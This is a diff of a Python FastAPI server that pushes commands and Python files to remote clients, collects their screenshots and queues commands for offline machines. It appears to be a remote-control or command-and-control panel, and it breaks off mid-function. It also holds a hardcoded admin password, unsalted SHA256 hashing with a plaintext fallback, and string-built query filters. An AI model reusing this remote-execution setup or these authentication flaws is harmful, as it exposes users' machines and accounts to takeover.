@@ -19,6 +19,7 @@ import base64
 import hashlib
 import mimetypes
 import io
+import aiohttp
 
 # ========== CONFIGURATION ==========
 logging.basicConfig(
@@ -181,7 +182,7 @@ async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(
 
 # ========== SUPABASE HELPER FUNCTIONS ==========
 def hash_password(password: str) -> str:
-    """Hash password using SHA256 (use bcrypt in production)"""
+    """Hash password using SHA256"""
     return hashlib.sha256(password.encode()).hexdigest()
 
 async def verify_supabase_user(email: str, password: str) -> Optional[dict]:
@@ -203,13 +204,13 @@ async def verify_supabase_user(email: str, password: str) -> Optional[dict]:
         
         user_data = response.data[0]
         
-        # Verify password (in production, use proper password hashing)
+        # Verify password
         hashed_input = hash_password(password)
         
-        # For now, accept direct password match or hashed match
-        if (user_data.get("password") == password or 
-            user_data.get("password_hash") == hashed_input or
-            user_data.get("password_hash") == password):
+        # Check stored hash or plain text (for compatibility)
+        stored_password = user_data.get("password_hash") or user_data.get("password")
+        
+        if stored_password and (stored_password == hashed_input or stored_password == password):
             
             # Update last login
             supabase.table("users")\
@@ -249,8 +250,7 @@ async def create_supabase_user(user_data: dict) -> Optional[dict]:
         new_user = {
             "id": str(uuid.uuid4()),
             "email": user_data["email"].lower(),
-            "password": user_data["password"],  # Store plain text (for compatibility)
-            "password_hash": hash_password(user_data["password"]),  # Store hash
+            "password_hash": hash_password(user_data["password"]),
             "is_admin": user_data.get("is_admin", False),
             "theme": user_data.get("theme", "cyberpunk"),
             "is_active": True,
@@ -273,7 +273,7 @@ async def create_supabase_user(user_data: dict) -> Optional[dict]:
     
     return None
 
-# ========== IN-MEMORY DATABASE (FALLBACK) ==========
+# ========== IN-MEMORY DATABASE ==========
 class Database:
     def __init__(self):
         self.users = {}
@@ -284,11 +284,12 @@ class Database:
         self.chat_messages = []
         self.user_tags = {}
         self.files = {}
+        self.client_heartbeats = {}  # Track client heartbeats
         self.init_default_data()
         self.init_user_tags()
     
     def init_default_data(self):
-        # Default users - with special theme for Nathan
+        # Default users
         default_users = [
             {
                 "id": str(uuid.uuid4()),
@@ -326,7 +327,7 @@ class Database:
                 "password": "femboy67",
                 "is_admin": True,
                 "is_active": True,
-                "theme": "femboy",  # Special theme for Nathan
+                "theme": "femboy",
                 "created_at": datetime.utcnow().isoformat(),
                 "last_login": None
             }
@@ -335,10 +336,21 @@ class Database:
         for user in default_users:
             self.users[user["email"].lower()] = user
         
-        
+        # Default client
+        self.clients["default"] = {
+            "id": str(uuid.uuid4()),
+            "client_id": "default",
+            "name": "Default Client",
+            "ip_address": "127.0.0.1",
+            "os_info": "Windows 11",
+            "hardware_info": {},
+            "online": False,
+            "ws_online": False,
+            "last_seen": datetime.utcnow().isoformat(),
+            "registered_at": datetime.utcnow().isoformat()
+        }
     
     def init_user_tags(self):
-        # Special user tags
         self.user_tags["xotiic"] = {
             "user_id": "xotiic",
             "role": "owner",
@@ -376,6 +388,17 @@ class Database:
     
     def get_user_tag(self, user_id: str):
         return self.user_tags.get(user_id.lower())
+    
+    def update_client_heartbeat(self, client_id: str):
+        """Update client heartbeat timestamp"""
+        self.client_heartbeats[client_id] = datetime.utcnow().timestamp()
+    
+    def is_client_alive(self, client_id: str, timeout: int = 60) -> bool:
+        """Check if client is alive based on heartbeat"""
+        last_heartbeat = self.client_heartbeats.get(client_id)
+        if not last_heartbeat:
+            return False
+        return (datetime.utcnow().timestamp() - last_heartbeat) < timeout
 
 # Initialize database
 db = Database()
@@ -385,7 +408,9 @@ class ConnectionManager:
     def __init__(self):
         self.client_connections: Dict[str, WebSocket] = {}
         self.admin_connections: List[WebSocket] = []
-        self.chat_connections: Dict[str, WebSocket] = {}  # user_id -> WebSocket
+        self.chat_connections: Dict[str, WebSocket] = {}
+        self.connection_times: Dict[str, float] = {}  # Track connection time
+        self.pending_messages: Dict[str, List[dict]] = {}  # Store messages for offline clients
 
     async def connect_admin(self, websocket: WebSocket):
         await websocket.accept()
@@ -395,6 +420,7 @@ class ConnectionManager:
     async def connect_client(self, websocket: WebSocket, client_id: str):
         await websocket.accept()
         self.client_connections[client_id] = websocket
+        self.connection_times[client_id] = time.time()
         logger.info(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
         
         # Update client status
@@ -403,7 +429,7 @@ class ConnectionManager:
             db.clients[client_id]["ws_online"] = True
             db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
         
-        # Store in Supabase if available
+        # Store in Supabase
         if supabase:
             try:
                 supabase.table("clients")\
@@ -416,6 +442,12 @@ class ConnectionManager:
                     .execute()
             except Exception as e:
                 logger.error(f"Supabase update client error: {e}")
+        
+        # Send pending messages if any
+        if client_id in self.pending_messages:
+            for msg in self.pending_messages[client_id]:
+                await self.send_to_client(client_id, msg)
+            del self.pending_messages[client_id]
         
         # Notify admins
         await self.notify_admins({
@@ -430,14 +462,14 @@ class ConnectionManager:
         self.chat_connections[user_id] = websocket
         logger.info(f"💬 Chat connected: {user_id}. Total chat users: {len(self.chat_connections)}")
         
-        # Notify others about user online status
+        # Notify others
         await self.broadcast_chat({
             "type": "user_online",
             "user_id": user_id,
             "timestamp": datetime.utcnow().isoformat()
         }, exclude_user=user_id)
         
-        # Send initial messages
+        # Send initial data
         await self.send_chat_history(user_id)
         await self.send_user_list(user_id)
     
@@ -445,7 +477,6 @@ class ConnectionManager:
         """Send chat history to user"""
         if user_id in self.chat_connections:
             try:
-                # Get last 50 messages
                 messages = db.chat_messages[-50:] if len(db.chat_messages) > 50 else db.chat_messages
                 
                 await self.chat_connections[user_id].send_json({
@@ -498,6 +529,9 @@ class ConnectionManager:
         
         if client_id:
             del self.client_connections[client_id]
+            if client_id in self.connection_times:
+                del self.connection_times[client_id]
+            
             logger.info(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
             
             # Update client status
@@ -536,7 +570,7 @@ class ConnectionManager:
             del self.chat_connections[chat_user_id]
             logger.info(f"💬 Chat disconnected: {chat_user_id}. Total chat users: {len(self.chat_connections)}")
             
-            # Notify others about user offline status
+            # Notify others
             asyncio.create_task(self.broadcast_chat({
                 "type": "user_offline",
                 "user_id": chat_user_id,
@@ -569,7 +603,16 @@ class ConnectionManager:
                 # Remove disconnected client
                 if client_id in self.client_connections:
                     del self.client_connections[client_id]
+                # Store message for later delivery
+                if client_id not in self.pending_messages:
+                    self.pending_messages[client_id] = []
+                self.pending_messages[client_id].append(message)
                 return False
+        
+        # Client not connected, store message
+        if client_id not in self.pending_messages:
+            self.pending_messages[client_id] = []
+        self.pending_messages[client_id].append(message)
         return False
     
     async def broadcast_chat(self, message: dict, exclude_user: str = None):
@@ -598,13 +641,41 @@ class ConnectionManager:
                 logger.error(f"Failed to send to user {user_id}: {e}")
                 return False
         return False
+    
+    def check_connection_timeouts(self):
+        """Check for timed out connections"""
+        current_time = time.time()
+        timed_out = []
+        
+        for client_id, conn_time in self.connection_times.items():
+            if current_time - conn_time > 300:  # 5 minute timeout
+                timed_out.append(client_id)
+        
+        for client_id in timed_out:
+            if client_id in self.client_connections:
+                asyncio.create_task(self.cleanup_client(client_id))
+
+    async def cleanup_client(self, client_id: str):
+        """Clean up a client connection"""
+        if client_id in self.client_connections:
+            try:
+                ws = self.client_connections[client_id]
+                await ws.close()
+            except:
+                pass
+            
+            del self.client_connections[client_id]
+            if client_id in self.connection_times:
+                del self.connection_times[client_id]
+            
+            logger.info(f"🖥️  Client timed out: {client_id}")
 
 manager = ConnectionManager()
 
 # ========== API ROUTES ==========
 @app.post("/api/login", response_model=dict)
 async def login(data: LoginRequest):
-    """Login endpoint - tries Supabase first, falls back to in-memory"""
+    """Login endpoint"""
     try:
         logger.info(f"Login attempt for user: {data.email}")
         
@@ -638,7 +709,6 @@ async def login(data: LoginRequest):
                 "is_active": user.get("is_active", True)
             }
             
-            # Update last login
             db.update_user_last_login(data.email)
         
         logger.info(f"✅ User authenticated: {user_data.get('email')}")
@@ -674,7 +744,7 @@ async def login(data: LoginRequest):
 
 @app.post("/api/create-account", response_model=dict)
 async def create_account(data: UserCreate, user: dict = Depends(authenticate_user)):
-    """Create a new user account (xotiic only)"""
+    """Create a new user account"""
     try:
         # Check if user is xotiic (owner)
         if user.get("email") != "xotiic":
@@ -734,7 +804,6 @@ async def create_account(data: UserCreate, user: dict = Depends(authenticate_use
 async def get_users(user: dict = Depends(authenticate_user)):
     """Get all users (admin only)"""
     try:
-        # Check if user is admin
         if not user.get("is_admin"):
             raise HTTPException(status_code=403, detail="Admin access required")
         
@@ -788,7 +857,7 @@ async def register_client(data: ClientRegister, request: Request):
             else:
                 data.ip_address = "Unknown"
         
-        # Check if client exists in memory
+        # Check if client exists
         action = "updated" if data.client_id in db.clients else "registered"
         
         # Update in-memory database
@@ -1015,23 +1084,43 @@ async def send_command(data: CommandRequest, user: dict = Depends(authenticate_u
 async def execute_python_file(data: PythonFileRequest, user: dict = Depends(authenticate_user)):
     """Execute Python file on client"""
     try:
-        # Check if client is connected via WebSocket
-        if data.client_id not in manager.client_connections:
-            raise HTTPException(status_code=400, detail="Client not connected")
-        
-        # Send via WebSocket
-        sent = await manager.send_to_client(data.client_id, {
-            "type": "python_execute",
-            "command_id": str(uuid.uuid4()),
-            "filename": data.filename,
-            "content": data.content,
-            "parameters": data.parameters or [],
-            "from_user": user.get("email", "unknown"),
-            "timestamp": datetime.utcnow().isoformat()
-        })
+        # Send via WebSocket if client is connected
+        sent = False
+        if data.client_id in manager.client_connections:
+            sent = await manager.send_to_client(data.client_id, {
+                "type": "python_execute",
+                "command_id": str(uuid.uuid4()),
+                "filename": data.filename,
+                "content": data.content,
+                "parameters": data.parameters or [],
+                "from_user": user.get("email", "unknown"),
+                "timestamp": datetime.utcnow().isoformat()
+            })
         
         if not sent:
-            raise HTTPException(status_code=400, detail="Failed to send command to client")
+            # Store command for later delivery
+            command_id = str(uuid.uuid4())
+            command_data = {
+                "id": command_id,
+                "client_id": data.client_id,
+                "command": "python_execute",
+                "parameters": {
+                    "filename": data.filename,
+                    "content": data.content,
+                    "parameters": data.parameters or []
+                },
+                "status": "pending",
+                "user_email": user.get("email", "unknown"),
+                "created_at": datetime.utcnow().isoformat()
+            }
+            
+            db.commands.append(command_data)
+            
+            if supabase:
+                try:
+                    supabase.table("commands").insert(command_data).execute()
+                except Exception as e:
+                    logger.error(f"Supabase command storage error: {e}")
         
         # Log the execution
         log_entry = {
@@ -1059,7 +1148,8 @@ async def execute_python_file(data: PythonFileRequest, user: dict = Depends(auth
             "success": True,
             "message": "Python file sent for execution",
             "filename": data.filename,
-            "client_id": data.client_id
+            "client_id": data.client_id,
+            "sent_via_websocket": sent
         }
         
     except Exception as e:
@@ -1077,18 +1167,8 @@ async def upload_screenshot(data: ScreenshotRequest):
             raise HTTPException(status_code=400, detail="Invalid image data")
         
         # Store in memory
-        screenshot_data = {
-            "id": str(uuid.uuid4()),
-            "client_id": data.client_id,
-            "image_data": data.image_data,
-            "filename": data.filename,
-            "size": len(image_data),
-            "created_at": datetime.utcnow().isoformat()
-        }
-        
-        # We'll just store metadata, not the actual image in memory
         screenshot_metadata = {
-            "id": screenshot_data["id"],
+            "id": str(uuid.uuid4()),
             "client_id": data.client_id,
             "filename": data.filename,
             "size": len(image_data),
@@ -1098,7 +1178,13 @@ async def upload_screenshot(data: ScreenshotRequest):
         # Store in Supabase if available
         if supabase:
             try:
-                supabase.table("screenshots").insert(screenshot_data).execute()
+                supabase.table("screenshots").insert({
+                    "client_id": data.client_id,
+                    "filename": data.filename,
+                    "image_data": data.image_data,
+                    "size": len(image_data),
+                    "created_at": datetime.utcnow().isoformat()
+                }).execute()
             except Exception as e:
                 logger.error(f"Supabase screenshot storage error: {e}")
         
@@ -1280,7 +1366,9 @@ async def get_stats(user: dict = Depends(authenticate_user)):
             "total_commands": 0,
             "today_logs": 0,
             "total_screenshots": 0,
-            "total_users": 0
+            "total_users": 0,
+            "active_admins": len(manager.admin_connections),
+            "chat_users": len(manager.chat_connections)
         }
         
         # Get from Supabase if available
@@ -1327,9 +1415,6 @@ async def get_stats(user: dict = Depends(authenticate_user)):
         stats["today_logs"] = max(stats["today_logs"], len([l for l in db.logs if l.get("created_at", "").startswith(datetime.utcnow().date().isoformat())]))
         stats["total_users"] = max(stats["total_users"], len(db.users))
         
-        stats["active_admins"] = len(manager.admin_connections)
-        stats["chat_users"] = len(manager.chat_connections)
-        
         return {
             "success": True,
             "stats": stats
@@ -1338,7 +1423,49 @@ async def get_stats(user: dict = Depends(authenticate_user)):
         logger.error(f"Get stats error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
-# ========== UPDATE CHAT MESSAGES ENDPOINT ==========
+@app.post("/api/client/heartbeat", response_model=dict)
+async def client_heartbeat(data: dict):
+    """Receive heartbeat from client"""
+    try:
+        client_id = data.get("client_id")
+        if not client_id:
+            return {"success": False, "error": "Client ID required"}
+        
+        # Update heartbeat timestamp
+        db.update_client_heartbeat(client_id)
+        
+        # Update client last_seen
+        if client_id in db.clients:
+            db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
+            db.clients[client_id]["online"] = True
+        
+        # Update Supabase
+        if supabase:
+            try:
+                supabase.table("clients")\
+                    .update({
+                        "last_seen": datetime.utcnow().isoformat(),
+                        "online": True
+                    })\
+                    .eq("client_id", client_id)\
+                    .execute()
+            except Exception as e:
+                logger.error(f"Supabase heartbeat update error: {e}")
+        
+        # Check if client has pending messages
+        if client_id in manager.pending_messages and manager.pending_messages[client_id]:
+            return {
+                "success": True,
+                "has_pending_messages": True,
+                "message_count": len(manager.pending_messages[client_id])
+            }
+        
+        return {"success": True, "has_pending_messages": False}
+        
+    except Exception as e:
+        logger.error(f"Heartbeat error: {e}")
+        return {"success": False, "error": str(e)}
+
 @app.get("/api/chat/messages", response_model=dict)
 async def get_chat_messages(
     user: dict = Depends(authenticate_user),
@@ -1358,16 +1485,13 @@ async def get_chat_messages(
             # Filter messages based on recipient
             if recipient:
                 if recipient == "all":
-                    # Global chat messages
-                    query = query.or_(f"recipient.eq.all,recipient.is.null")
+                    query = query.or_("recipient.eq.all,recipient.is.null")
                 else:
-                    # Private messages between users
                     query = query.or_(
                         f"and(sender.eq.{user_id},recipient.eq.{recipient})," +
                         f"and(sender.eq.{recipient},recipient.eq.{user_id})"
                     )
             else:
-                # All messages visible to user
                 query = query.or_(
                     f"recipient.eq.all,recipient.is.null," +
                     f"recipient.eq.{user_id},sender.eq.{user_id}"
@@ -1387,20 +1511,17 @@ async def get_chat_messages(
             # Filter messages based on recipient
             if recipient:
                 if recipient == "all":
-                    # Global chat messages
                     messages = [
                         msg for msg in messages
                         if msg["recipient"] in ["all", None]
                     ]
                 else:
-                    # Private messages between users
                     messages = [
                         msg for msg in messages
                         if (msg["sender"] == user_id and msg["recipient"] == recipient) or
                            (msg["sender"] == recipient and msg["recipient"] == user_id)
                     ]
             else:
-                # All messages visible to user
                 messages = [
                     msg for msg in messages
                     if (msg["recipient"] in [user_id, "all", None] or 
@@ -1422,7 +1543,7 @@ async def get_chat_messages(
         
         return {
             "success": True,
-            "messages": messages[::-1],  # Return in chronological order
+            "messages": messages[::-1],
             "total": len(messages)
         }
         
@@ -1430,7 +1551,6 @@ async def get_chat_messages(
         logger.error(f"Get chat messages error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
-# ========== ADD PRIVATE CONVERSATIONS ENDPOINT ==========
 @app.get("/api/chat/conversations", response_model=dict)
 async def get_conversations(user: dict = Depends(authenticate_user)):
     """Get list of users you have conversations with"""
@@ -1440,7 +1560,6 @@ async def get_conversations(user: dict = Depends(authenticate_user)):
         
         # Get from Supabase if available
         if supabase:
-            # Get all messages involving this user
             response = supabase.table("chat_messages")\
                 .select("sender, recipient")\
                 .or_(f"sender.eq.{user_id},recipient.eq.{user_id}")\
@@ -1483,65 +1602,6 @@ async def get_conversations(user: dict = Depends(authenticate_user)):
         logger.error(f"Get conversations error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
-@app.get("/api/chat/messages", response_model=dict)
-async def get_chat_messages(
-    user: dict = Depends(authenticate_user),
-    limit: int = Query(100, ge=1, le=1000),
-    before: Optional[str] = Query(None)
-):
-    """Get chat messages"""
-    try:
-        user_id = user.get("email")
-        messages = []
-        
-        # Get from Supabase if available
-        if supabase:
-            query = supabase.table("chat_messages").select("*")
-            
-            # Filter messages visible to user
-            query = query.or_(f"recipient.eq.{user_id},recipient.is.null,recipient.eq.all,sender.eq.{user_id}")
-            
-            if before:
-                query = query.lt("timestamp", before)
-            
-            response = query.order("timestamp", desc=True).limit(limit).execute()
-            
-            if response.data:
-                messages = response.data
-        else:
-            # Fallback to in-memory
-            messages = db.chat_messages.copy()
-            
-            # Filter messages visible to user
-            messages = [
-                msg for msg in messages
-                if (msg["recipient"] in [user_id, "all", None] or 
-                    msg["sender"] == user_id or 
-                    user_id in msg.get("read_by", []))
-            ]
-            
-            if before:
-                messages = [msg for msg in messages if msg["timestamp"] < before]
-            
-            messages.sort(key=lambda x: x["timestamp"], reverse=True)
-            messages = messages[:limit]
-        
-        # Add user tags to messages
-        for msg in messages:
-            sender_tag = db.get_user_tag(msg["sender"])
-            if sender_tag:
-                msg["sender_tag"] = sender_tag
-        
-        return {
-            "success": True,
-            "messages": messages[::-1],  # Return in chronological order
-            "total": len(messages)
-        }
-        
-    except Exception as e:
-        logger.error(f"Get chat messages error: {e}")
-        raise HTTPException(status_code=500, detail="Internal server error")
-
 @app.get("/api/chat/users", response_model=dict)
 async def get_chat_users(user: dict = Depends(authenticate_user)):
     """Get online chat users"""
@@ -1575,7 +1635,7 @@ async def get_chat_users(user: dict = Depends(authenticate_user)):
         for user_obj in all_users:
             user_email = user_obj["email"]
             if user_email == user.get("email"):
-                continue  # Skip current user
+                continue
                 
             tag = db.get_user_tag(user_email)
             
@@ -1711,19 +1771,88 @@ async def mark_message_read(
                 msg.setdefault("read_by", []).append(user_id)
                 break
         
-        # Update Supabase
-        if supabase:
-            try:
-                # This would need a more complex update in Supabase
-                # For simplicity, we'll just log it
-                logger.info(f"User {user_id} read message {message_id}")
-            except Exception as e:
-                logger.error(f"Supabase read update error: {e}")
-        
         return {"success": True}
         
     except Exception as e:
         logger.error(f"Mark read error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/chat/send", response_model=dict)
+async def send_chat_message(data: ChatMessage, user: dict = Depends(authenticate_user)):
+    """Send a chat message"""
+    try:
+        user_id = user.get("email")
+        
+        # Prepare message data
+        message_data = {
+            "id": str(uuid.uuid4()),
+            "sender": user_id,
+            "recipient": data.recipient if data.recipient != "all" else None,
+            "message": data.message,
+            "is_voice_note": data.is_voice_note,
+            "timestamp": datetime.utcnow().isoformat(),
+            "read_by": [user_id]
+        }
+        
+        # Add file data if present
+        if data.file_data:
+            message_data.update({
+                "file_data": data.file_data,
+                "file_name": data.file_name,
+                "file_type": data.file_type,
+                "size": len(base64.b64decode(data.file_data)) if data.file_data else 0
+            })
+        
+        # Get sender tag
+        sender_tag = db.get_user_tag(user_id)
+        
+        # Store in database
+        db.add_chat_message(message_data)
+        
+        # Store in Supabase if available
+        if supabase:
+            try:
+                supabase_message = message_data.copy()
+                if supabase_message.get("recipient") is None:
+                    supabase_message["recipient"] = "all"
+                
+                supabase.table("chat_messages").insert(supabase_message).execute()
+            except Exception as e:
+                logger.error(f"Supabase chat message storage error: {e}")
+        
+        # Send via WebSocket
+        if data.recipient == "all" or data.recipient is None:
+            await manager.broadcast_chat({
+                "type": "new_message",
+                "message": message_data,
+                "sender_tag": sender_tag,
+                "timestamp": datetime.utcnow().isoformat()
+            }, exclude_user=user_id)
+        else:
+            await manager.send_to_user(data.recipient, {
+                "type": "new_message",
+                "message": message_data,
+                "sender_tag": sender_tag,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+            
+            await manager.send_to_user(user_id, {
+                "type": "new_message",
+                "message": message_data,
+                "sender_tag": sender_tag,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+        
+        logger.info(f"💬 Chat message sent from {user_id} to {data.recipient or 'all'}")
+        
+        return {
+            "success": True,
+            "message": "Message sent",
+            "message_id": message_data["id"]
+        }
+        
+    except Exception as e:
+        logger.error(f"Send chat message error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 # ========== HEALTH AND INFO ==========
@@ -1767,88 +1896,6 @@ async def get_user_theme(user: dict = Depends(authenticate_user)):
         logger.error(f"Get theme error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
-@app.post("/api/chat/send", response_model=dict)
-async def send_chat_message(data: ChatMessage, user: dict = Depends(authenticate_user)):
-    """Send a chat message"""
-    try:
-        user_id = user.get("email")
-        
-        # Prepare message data
-        message_data = {
-            "id": str(uuid.uuid4()),
-            "sender": user_id,
-            "recipient": data.recipient if data.recipient != "all" else None,
-            "message": data.message,
-            "is_voice_note": data.is_voice_note,
-            "timestamp": datetime.utcnow().isoformat(),
-            "read_by": [user_id]
-        }
-        
-        # Add file data if present
-        if data.file_data:
-            message_data.update({
-                "file_data": data.file_data,
-                "file_name": data.file_name,
-                "file_type": data.file_type,
-                "size": len(base64.b64decode(data.file_data)) if data.file_data else 0
-            })
-        
-        # Get sender tag
-        sender_tag = db.get_user_tag(user_id)
-        
-        # Store in database
-        db.add_chat_message(message_data)
-        
-        # Store in Supabase if available
-        if supabase:
-            try:
-                supabase_message = message_data.copy()
-                # Convert for Supabase storage
-                if supabase_message.get("recipient") is None:
-                    supabase_message["recipient"] = "all"
-                
-                supabase.table("chat_messages").insert(supabase_message).execute()
-            except Exception as e:
-                logger.error(f"Supabase chat message storage error: {e}")
-        
-        # Send via WebSocket to recipient
-        if data.recipient == "all" or data.recipient is None:
-            # Broadcast to all chat users except sender
-            await manager.broadcast_chat({
-                "type": "new_message",
-                "message": message_data,
-                "sender_tag": sender_tag,
-                "timestamp": datetime.utcnow().isoformat()
-            }, exclude_user=user_id)
-        else:
-            # Send to specific recipient
-            await manager.send_to_user(data.recipient, {
-                "type": "new_message",
-                "message": message_data,
-                "sender_tag": sender_tag,
-                "timestamp": datetime.utcnow().isoformat()
-            })
-            
-            # Also send to sender (for their own UI)
-            await manager.send_to_user(user_id, {
-                "type": "new_message",
-                "message": message_data,
-                "sender_tag": sender_tag,
-                "timestamp": datetime.utcnow().isoformat()
-            })
-        
-        logger.info(f"💬 Chat message sent from {user_id} to {data.recipient or 'all'}")
-        
-        return {
-            "success": True,
-            "message": "Message sent",
-            "message_id": message_data["id"]
-        }
-        
-    except Exception as e:
-        logger.error(f"Send chat message error: {e}")
-        raise HTTPException(status_code=500, detail="Internal server error")
-
 # ========== WEBSOCKET ENDPOINTS ==========
 @app.websocket("/ws/admin")
 async def websocket_admin(websocket: WebSocket):
@@ -1868,7 +1915,6 @@ async def websocket_admin(websocket: WebSocket):
             try:
                 data = await websocket.receive_json()
                 
-                # Handle ping
                 if data.get("type") == "ping":
                     await websocket.send_json({
                         "type": "pong",
@@ -1897,188 +1943,170 @@ async def websocket_client(websocket: WebSocket, client_id: str):
         await websocket.send_json({
             "type": "welcome",
             "message": f"Connected to server as {client_id}",
-            "server_time": datetime.utcnow().isoformat()
+            "server_time": datetime.utcnow().isoformat(),
+            "client_id": client_id
         })
         
         while True:
             try:
                 data = await websocket.receive_json()
-                data_type = data.get("type")
+                await handle_client_message(client_id, data, websocket)
                 
-                if data_type == "heartbeat":
-                    # Update last seen
-                    if client_id in db.clients:
-                        db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
-                        db.clients[client_id]["online"] = True
-                    
-                    # Update Supabase
-                    if supabase:
-                        try:
-                            supabase.table("clients")\
-                                .update({
-                                    "last_seen": datetime.utcnow().isoformat(),
-                                    "online": True
-                                })\
-                                .eq("client_id", client_id)\
-                                .execute()
-                        except Exception as e:
-                            logger.error(f"Supabase heartbeat update error: {e}")
-                    
-                    # Send heartbeat response
-                    await websocket.send_json({
-                        "type": "heartbeat_response",
-                        "timestamp": datetime.utcnow().isoformat()
-                    })
-                    
-                elif data_type == "command_result":
-                    # Update command status
-                    command_id = data.get("command_id")
-                    
-                    # Update in-memory
-                    for cmd in db.commands:
-                        if cmd["id"] == command_id:
-                            cmd["status"] = "completed"
-                            cmd["result"] = data.get("result")
-                            cmd["completed_at"] = datetime.utcnow().isoformat()
-                            cmd["error"] = data.get("error", "")
-                            break
-                    
-                    # Update Supabase
-                    if supabase:
-                        try:
-                            supabase.table("commands")\
-                                .update({
-                                    "status": "completed",
-                                    "result": data.get("result"),
-                                    "error": data.get("error", ""),
-                                    "completed_at": datetime.utcnow().isoformat()
-                                })\
-                                .eq("id", command_id)\
-                                .execute()
-                        except Exception as e:
-                            logger.error(f"Supabase command result update error: {e}")
-                    
-                    # Notify admins
-                    await manager.notify_admins({
-                        "type": "command_result",
-                        "client_id": client_id,
-                        "command_id": command_id,
-                        "command": data.get("command"),
-                        "result": data.get("result"),
-                        "error": data.get("error"),
-                        "timestamp": datetime.utcnow().isoformat()
-                    })
-                    
-                elif data_type == "python_result":
-                    # Handle Python execution result
-                    command_id = data.get("command_id")
-                    
-                    # Store in-memory
-                    for cmd in db.commands:
-                        if cmd["id"] == command_id:
-                            cmd["status"] = "completed"
-                            cmd["result"] = data.get("result")
-                            cmd["completed_at"] = datetime.utcnow().isoformat()
-                            cmd["error"] = data.get("error", "")
-                            break
-                    
-                    # Update Supabase
-                    if supabase:
-                        try:
-                            supabase.table("commands")\
-                                .update({
-                                    "status": "completed",
-                                    "result": data.get("result"),
-                                    "error": data.get("error", ""),
-                                    "completed_at": datetime.utcnow().isoformat()
-                                })\
-                                .eq("id", command_id)\
-                                .execute()
-                        except Exception as e:
-                            logger.error(f"Supabase Python result update error: {e}")
-                    
-                    # Notify admins
-                    await manager.notify_admins({
-                        "type": "python_result",
-                        "client_id": client_id,
-                        "command_id": command_id,
-                        "filename": data.get("filename"),
-                        "result": data.get("result"),
-                        "error": data.get("error"),
-                        "timestamp": datetime.utcnow().isoformat()
-                    })
-                    
-                elif data_type == "log":
-                    # Store log
-                    log_entry = {
-                        "id": str(uuid.uuid4()),
-                        "client_id": client_id,
-                        "log_type": data.get("log_type", "info"),
-                        "message": data.get("message", ""),
-                        "created_at": datetime.utcnow().isoformat()
-                    }
-                    
-                    db.logs.append(log_entry)
-                    
-                    # Store in Supabase
-                    if supabase:
-                        try:
-                            supabase.table("logs").insert({
-                                "client_id": client_id,
-                                "log_type": data.get("log_type", "info"),
-                                "message": data.get("message", ""),
-                                "created_at": datetime.utcnow().isoformat()
-                            }).execute()
-                        except Exception as e:
-                            logger.error(f"Supabase log storage error: {e}")
-                    
-                    # Notify admins
-                    await manager.notify_admins({
-                        "type": "client_log",
-                        "client_id": client_id,
-                        "log_type": data.get("log_type", "info"),
-                        "message": data.get("message", ""),
-                        "timestamp": datetime.utcnow().isoformat()
-                    })
-                    
-                elif data_type == "client_chat_response":
-                    # Forward client chat response to admins
-                    await manager.notify_admins({
-                        "type": "client_chat_response",
-                        "client_id": client_id,
-                        "message": data.get("message", ""),
-                        "original_message": data.get("original_message", ""),
-                        "timestamp": datetime.utcnow().isoformat()
-                    })
-                    
-                elif data_type == "client_chat_ack":
-                    # Acknowledge chat message receipt
-                    await manager.notify_admins({
-                        "type": "client_chat_ack",
-                        "client_id": client_id,
-                        "message_received": data.get("message_received", ""),
-                        "timestamp": datetime.utcnow().isoformat()
-                    })
-                    
             except WebSocketDisconnect:
                 break
             except Exception as e:
-                logger.error(f"Error processing WebSocket message: {e}")
+                logger.error(f"Error processing message from {client_id}: {e}")
                 continue
                 
     except WebSocketDisconnect:
-        # Mark client as offline
-        if client_id in db.clients:
-            db.clients[client_id]["online"] = False
-            db.clients[client_id]["ws_online"] = False
-        manager.disconnect(websocket)
+        pass
     except Exception as e:
         logger.error(f"Client WebSocket error: {e}")
-        # Mark client as offline
-        if client_id in db.clients:
-            db.clients[client_id]["online"] = False
-            db.clients[client_id]["ws_online"] = False
+    finally:
+        # Cleanup
         manager.disconnect(websocket)
+
+async def handle_client_message(client_id: str, data: dict, websocket: WebSocket):
+    """Handle messages from client"""
+    message_type = data.get("type")
+    
+    if message_type == "heartbeat":
+        # Update client heartbeat
+        db.update_client_heartbeat(client_id)
+        
+        if client_id in db.clients:
+            db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
+            db.clients[client_id]["online"] = True
+        
+        # Send heartbeat response
+        await websocket.send_json({
+            "type": "heartbeat_response",
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+    elif message_type == "command_result":
+        # Update command status
+        command_id = data.get("command_id")
+        
+        for cmd in db.commands:
+            if cmd["id"] == command_id:
+                cmd["status"] = "completed"
+                cmd["result"] = data.get("result")
+                cmd["completed_at"] = datetime.utcnow().isoformat()
+                cmd["error"] = data.get("error", "")
+                break
+        
+        # Update Supabase
+        if supabase:
+            try:
+                supabase.table("commands")\
+                    .update({
+                        "status": "completed",
+                        "result": data.get("result"),
+                        "error": data.get("error", ""),
+                        "completed_at": datetime.utcnow().isoformat()
+                    })\
+                    .eq("id", command_id)\
+                    .execute()
+            except Exception as e:
+                logger.error(f"Supabase command result update error: {e}")
+        
+        # Notify admins
+        await manager.notify_admins({
+            "type": "command_result",
+            "client_id": client_id,
+            "command_id": command_id,
+            "command": data.get("command"),
+            "result": data.get("result"),
+            "error": data.get("error"),
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+    elif message_type == "python_result":
+        command_id = data.get("command_id")
+        
+        for cmd in db.commands:
+            if cmd["id"] == command_id:
+                cmd["status"] = "completed"
+                cmd["result"] = data.get("result")
+                cmd["completed_at"] = datetime.utcnow().isoformat()
+                cmd["error"] = data.get("error", "")
+                break
+        
+        if supabase:
